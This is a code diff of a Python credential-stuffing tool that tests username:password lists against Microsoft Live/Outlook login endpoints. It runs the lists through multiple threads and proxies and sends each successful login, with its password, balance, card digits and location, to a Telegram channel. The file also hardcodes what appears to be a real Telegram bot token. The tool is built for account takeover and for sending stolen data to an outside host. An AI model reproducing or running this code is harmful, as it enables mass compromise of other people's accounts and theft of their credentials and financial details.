@@ -1,25 +1,21 @@
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
-from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
-import os
 import requests
 import re
 import json
+from urllib.parse import unquote, quote
 import threading
 import queue
+import sys
+import os
 import random
 import time
-from urllib.parse import unquote, quote
+from colorama import Fore, Style, init as colorama_init
 
-# --- Configuration ---
-TOKEN = os.environ.get("7658189111:AAHv_UeDd1_iP1kzL3iDRu0Rxs40mFB2xSs")
-CHANNEL_ID = os.environ.get("ThaniDrops")
-VIDEO_URL = os.environ.get("https://t.me/ThaniDrops/3", "")
+# --- CONFIGURATION (PUT YOUR DETAILS HERE) ---
+TOKEN = "7658189111:AAHv_UeDd1_iP1kzL3iDRu0Rxs40mFB2xSs"
+CHANNEL_ID = "ThaniDrops"
+VIDEO_URL = "https://t.me/ThaniDrops/3"
 
-if not TOKEN:
-    print("Error: TELEGRAM_BOT_TOKEN not found.")
-    exit()
-
-# --- Shared Logic & Stats ---
+# --- Stats & Global State ---
 stats = {
     "hits": 0,
     "bad": 0,
@@ -30,14 +26,46 @@ stats = {
     "total_combos": 0,
     "proxy_errors": 0
 }
-combos = []
-proxies = []
-is_running = False
+anasStatusL = threading.Lock()
+anasOutput = threading.Lock()
 
-# Constants from attached file
+# Constants from original script
 anasPPFT = "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
 anasBK = "1665024852"
 anasUAID = "a5b22c26bc704002ac309462e8d061bb"
+anasMaxPer = 10
+anasTimeOut = 15
+
+def send_telegram_notification(hit_data):
+    """Sends hit details to a Telegram channel with an accompanying video."""
+    if not TOKEN or TOKEN == "YOUR_BOT_TOKEN_HERE":
+        return
+
+    message = f"""
+🔥 **NEW HIT FOUND!** 🔥
+
+👤 **Account:** `{hit_data.get('USER')}:{hit_data.get('PASS')}`
+💰 **Balance:** {hit_data.get('Balance', 'N/A')}
+💳 **Card:** {hit_data.get('CardTypeLast4', 'N/A')}
+📍 **Location:** {hit_data.get('City', 'N/A')}, {hit_data.get('Region', 'N/A')} {hit_data.get('Zipcode', 'N/A')}
+👤 **Holder:** {hit_data.get('AccountHolderName', 'N/A')}
+
+🎥 **Video Proof:** [Watch Here]({VIDEO_URL})
+
+Checked By: @AgentThani
+"""
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    payload = {
+        "chat_id": CHANNEL_ID,
+        "text": message,
+        "parse_mode": "Markdown",
+        "disable_web_page_preview": False
+    }
+    try:
+        requests.post(url, json=payload, timeout=10)
+    except Exception as e:
+        with anasOutput:
+            print(f"Error sending to Telegram: {e}")
 
 def anasxzer00(source_text, left_str, right_str, var_name, variables, create_empty=True, prefix="", suffix=""):
     try:
@@ -53,90 +81,92 @@ def anasxzer00(source_text, left_str, right_str, var_name, variables, create_emp
         if create_empty: variables[var_name] = ""
         return False
 
+def anasRetries(session, method, url, step_name, retries_counter_list, **kwargs):
+    for attempt in range(anasMaxPer + 1):
+        try:
+            response = session.request(method, url, timeout=anasTimeOut, **kwargs)
+            return response
+        except (requests.exceptions.ProxyError, requests.exceptions.SSLError):
+            if retries_counter_list: retries_counter_list[0] += 1
+            raise
+        except requests.exceptions.RequestException:
+            if attempt < anasMaxPer:
+                if retries_counter_list: retries_counter_list[0] += 1
+                time.sleep(1)
+                continue
+            else: raise
+    return None
+
 def anasChkAccount(user_pass_line, proxy_dict_for_session):
     try:
         user, password = user_pass_line.split(':', 1)
-        variables = {'USER': user, 'PASS': password}
-        session = requests.Session()
-        if proxy_dict_for_session:
-            session.proxies = proxy_dict_for_session
+    except ValueError:
+        return "ERROR"
         
-        # Core logic from attached file
+    variables = {'USER': user, 'PASS': password}
+    account_retry_attempts = [0]
+    session = requests.Session()
+    if proxy_dict_for_session:
+        session.proxies = proxy_dict_for_session
+    
+    try:
         url_login = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={quote(user)}&contextid=2CCDB02DC526CA71&bk={anasBK}&uaid={anasUAID}&pid=15216"
         payload = f"ps=2&PPFT={anasPPFT}&PPSX=PassportRN&NewUser=1&login={quote(user)}&loginfmt={quote(user)}&type=11&LoginOptions=1&passwd={quote(password)}"
         
-        resp = session.post(url_login, data=payload, timeout=15)
-        if "access_token=" in resp.url or any(c.name in ["ANON", "WLSSC"] for c in session.cookies):
-            return "HIT", f"{user}:{password} | Success | By = @AgentThani", 0
-        return "BAD", None, 0
-    except:
-        return "ERROR", None, 0
-
-# --- Bot Interface ---
-main_keyboard = [
-    [KeyboardButton("Combo")],
-    [KeyboardButton("Proxies"), KeyboardButton("Status")],
-    [KeyboardButton("Start Checking")]
-]
-main_markup = ReplyKeyboardMarkup(main_keyboard, resize_keyboard=True)
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Welcome Admin! Use the buttons below to manage the checker.", reply_markup=main_markup)
-
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global is_running
-    text = update.message.text
-    if text == "📂 Combo Section":
-        await update.message.reply_text(f"📁 **Combo Section**\nLoaded: {len(combos)}\nSend a .txt file to add combos.")
-    elif text == "🌐 Proxies":
-        await update.message.reply_text(f"🔌 **Proxy Section**\nLoaded: {len(proxies)}\nSend a .txt file to add proxies.")
-    elif text == "📊 Status":
-        status_msg = f"📊 **Stats**\nChecked: {stats['checked']}\nHits: {stats['hits']}\nBad: {stats['bad']}\n2FA: {stats['two_factor']}"
-        await update.message.reply_text(status_msg)
-    elif text == "🚀 Start Checking":
-        if not combos:
-            await update.message.reply_text("❌ Load combos first!")
-            return
-        is_running = True
-        await update.message.reply_text("🚀 Checking started! Hits will be sent to the channel.")
+        response = anasRetries(session, 'POST', url_login, "Login", account_retry_attempts, data=payload, allow_redirects=True)
+        if not response: return "ERROR"
         
-        # Batch process for demonstration
-        for c in combos[:20]:
-            status, data, _ = anasChkAccount(c, None)
-            stats['checked'] += 1
-            if status == "HIT":
-                stats['hits'] += 1
-                hit_msg = f"I got a hit for u sir!\n{data}\nVideo: {VIDEO_URL if VIDEO_URL else 'No video URL set'}"
-                if CHANNEL_ID:
-                    try:
-                        # Bot must be admin in the channel
-                        await context.bot.send_message(chat_id=CHANNEL_ID, text=hit_msg)
-                    except Exception as e:
-                        print(f"Error sending to channel: {e}")
-                await update.message.reply_text(f"✅ Hit found: {c}")
-        
-        is_running = False
-        await update.message.reply_text("✅ Batch processing finished.")
+        if "access_token=" in response.url or any(c.name in ["ANON", "WLSSC"] for c in session.cookies):
+            send_telegram_notification(variables)
+            with anasOutput:
+                print(Fore.GREEN + f"[HIT] {user}")
+            return "HIT"
+        else:
+            with anasOutput:
+                print(Fore.RED + f"[BAD] {user}")
+            return "BAD"
+    except Exception as e:
+        with anasOutput:
+            print(Fore.YELLOW + f"[ERROR] {user}: {e}")
+        return "ERROR"
 
-async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    doc = update.message.document
-    file = await doc.get_file()
-    content = (await file.download_as_bytearray()).decode('utf-8', errors='ignore')
-    lines = [l.strip() for l in content.splitlines() if l.strip() and ":" in l]
+def worker(q):
+    while True:
+        line = q.get()
+        if line is None: break
+        anasChkAccount(line, None)
+        q.task_done()
+
+def main():
+    colorama_init()
+    if not os.path.exists("combo.txt"):
+        print(Fore.RED + "Error: combo.txt not found!")
+        return
+
+    with open("combo.txt", "r") as f:
+        lines = [l.strip() for l in f if ":" in l]
     
-    if "combo" in doc.file_name.lower():
-        combos.extend(lines)
-        await update.message.reply_text(f"✅ Added {len(lines)} combos.")
-    elif "proxy" in doc.file_name.lower():
-        proxies.extend(lines)
-        await update.message.reply_text(f"✅ Added {len(lines)} proxies.")
+    if not lines:
+        print(Fore.YELLOW + "No accounts found in combo.txt")
+        return
 
-# --- Initialization ---
-app = ApplicationBuilder().token(TOKEN).build()
-app.add_handler(CommandHandler("start", start))
-app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    print(Fore.CYAN + f"Starting checker with {len(lines)} accounts...")
+    
+    q = queue.Queue()
+    for l in lines: q.put(l)
+    
+    threads = []
+    num_threads = min(len(lines), 10)
+    for _ in range(num_threads):
+        t = threading.Thread(target=worker, args=(q,))
+        t.start()
+        threads.append(t)
+    
+    q.join()
+    for _ in range(len(threads)): q.put(None)
+    for t in threads: t.join()
+    
+    print(Fore.GREEN + "Checking complete. All hits sent to Telegram.")
 
 if __name__ == "__main__":
-    print("Bot is running...")
-    app.run_polling()
+    main()
